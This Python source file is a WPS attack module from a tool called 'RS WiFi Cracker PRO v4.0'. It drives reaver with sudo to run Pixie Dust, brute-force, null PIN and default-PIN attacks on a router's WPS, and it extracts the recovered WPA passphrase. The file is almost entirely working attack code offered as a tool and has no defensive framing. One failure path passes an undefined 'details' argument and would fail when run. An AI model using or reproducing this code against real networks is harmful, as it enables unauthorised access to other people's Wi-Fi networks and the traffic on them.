#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO v4.0 - WPS Attack Module"""

import os
import re
import sys
import time
import subprocess
import threading
from typing import Dict, List, Optional
from dataclasses import dataclass
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.logger import Logger

logger = Logger('WPS')


@dataclass
class WPSResult:
    success: bool
    bssid: str
    password: str = ""
    pin: str = ""
    method: str = ""
    time_taken: float = 0.0
    error: str = ""


class WPSAttacker:
    """WPS Attack Suite - Pixie Dust, Brute Force, Null PIN"""
    
    DEFAULT_PINS = [
        '12345670', '00000000', '11111111', '22222222', '33333333',
        '44444444', '55555555', '66666666', '77777777', '88888888',
        '99999999', '12345678', '87654321', '00000001', '12345098',
    ]
    
    def __init__(self, interface: str):
        self.interface = interface
        self.process = None
        self.stop_flag = False
        self.results: List[WPSResult] = []
        self.stats = {'attacks': 0, 'successful': 0, 'pins_tried': 0}
    
    def attack(self, bssid: str, attack_type: str = "pixie", options: Dict = None) -> WPSResult:
        """Main attack dispatcher"""
        self.stats['attacks'] += 1
        options = options or {}
        
        if attack_type == "pixie":
            result = self._pixie_dust(bssid)
        elif attack_type == "brute":
            result = self._brute_force(bssid, options.get('delay', 1))
        elif attack_type == "null":
            result = self._null_pin(bssid)
        elif attack_type == "custom":
            result = self._custom_pin(bssid, options.get('pin'))
        else:
            result = self._auto_detect(bssid)
        
        self.results.append(result)
        if result.success: self.stats['successful'] += 1
        return result
    
    def _pixie_dust(self, bssid: str) -> WPSResult:
        """WPS Pixie Dust attack"""
        start_time = time.time()
        try:
            cmd = ['sudo', 'reaver', '-i', self.interface, '-b', bssid, '-vv', '-K']
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            output_lines = []
            password = None
            pin = None
            
            for _ in range(300):
                if self.stop_flag: break
                line = self.process.stdout.readline()
                if not line: break
                output_lines.append(line)
                
                if 'WPS PIN' in line:
                    match = re.search(r'WPS PIN:\s*(\d+)', line)
                    if match: pin = match.group(1)
                
                if 'WPA PSK' in line:
                    match = re.search(r'WPA PSK:\s*[\'"]?([^\s\'"]+)', line)
                    if match:
                        password = match.group(1)
                        break
            
            self.process.terminate()
            
            if password:
                return WPSResult(success=True, bssid=bssid, password=password,
                                pin=pin, method='pixie_dust',
                                time_taken=time.time() - start_time)
            
            return WPSResult(success=False, bssid=bssid, method='pixie_dust',
                            error="Router not vulnerable", time_taken=time.time() - start_time)
        
        except FileNotFoundError:
            return WPSResult(success=False, bssid=bssid, error="reaver not found")
        except Exception as e:
            return WPSResult(success=False, bssid=bssid, error=str(e))
    
    def _brute_force(self, bssid: str, delay: int = 1) -> WPSResult:
        """WPS PIN brute force"""
        start_time = time.time()
        try:
            cmd = ['sudo', 'reaver', '-i', self.interface, '-b', bssid, '-vv', '-d', str(delay)]
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            password = None
            pin = None
            pins_tried = 0
            
            while not self.stop_flag:
                line = self.process.stdout.readline()
                if not line: break
                
                if 'Trying pin' in line.lower():
                    pins_tried += 1
                    self.stats['pins_tried'] += 1
                
                if 'WPS PIN' in line:
                    match = re.search(r'WPS PIN:\s*(\d+)', line)
                    if match: pin = match.group(1)
                
                if 'WPA PSK' in line:
                    match = re.search(r'WPA PSK:\s*[\'"]?([^\s\'"]+)', line)
                    if match:
                        password = match.group(1)
                        break
            
            self.process.terminate()
            
            if password:
                return WPSResult(success=True, bssid=bssid, password=password,
                                pin=pin, method='brute_force',
                                time_taken=time.time() - start_time)
            
            return WPSResult(success=False, bssid=bssid, method='brute_force',
                            error=f"Tried {pins_tried} PINs", time_taken=time.time() - start_time)
        
        except Exception as e:
            return WPSResult(success=False, bssid=bssid, error=str(e))
    
    def _null_pin(self, bssid: str) -> WPSResult:
        """Null PIN attack"""
        try:
            cmd = ['sudo', 'reaver', '-i', self.interface, '-b', bssid, '-vv', '-p', '']
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output, _ = self.process.communicate(timeout=30)
            
            if 'WPA PSK' in output:
                match = re.search(r'WPA PSK:\s*[\'"]?([^\s\'"]+)', output)
                if match:
                    return WPSResult(success=True, bssid=bssid,
                                    password=match.group(1), method='null_pin')
            
            return WPSResult(success=False, bssid=bssid, method='null_pin', error="Null PIN failed")
        except Exception as e:
            return WPSResult(success=False, bssid=bssid, error=str(e))
    
    def _custom_pin(self, bssid: str, pin: str) -> WPSResult:
        """Try specific PIN"""
        if not pin:
            return WPSResult(success=False, bssid=bssid, error="No PIN provided")
        
        try:
            cmd = ['sudo', 'reaver', '-i', self.interface, '-b', bssid, '-vv', '-p', pin]
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output, _ = self.process.communicate(timeout=60)
            
            if 'WPA PSK' in output:
                match = re.search(r'WPA PSK:\s*[\'"]?([^\s\'"]+)', output)
                if match:
                    return WPSResult(success=True, bssid=bssid,
                                    password=match.group(1), pin=pin, method='custom_pin')
            
            return WPSResult(success=False, bssid=bssid, method='custom_pin',
                            error="Custom PIN failed", details={'pin': pin})
        except Exception as e:
            return WPSResult(success=False, bssid=bssid, error=str(e))
    
    def _auto_detect(self, bssid: str) -> WPSResult:
        """Auto-detect and exploit"""
        # Try default PINs
        for pin in self.DEFAULT_PINS:
            if self.stop_flag:
                return WPSResult(success=False, bssid=bssid, error="Stopped")
            result = self._custom_pin(bssid, pin)
            if result.success:
                result.method = 'auto'
                return result
        
        # Try Pixie Dust
        result = self._pixie_dust(bssid)
        return result
    
    def stop(self):
        self.stop_flag = True
        if self.process: self.process.terminate()
    
    def get_stats(self) -> Dict: return self.stats.copy()
    def get_results(self) -> List[WPSResult]: return self.results.copy()
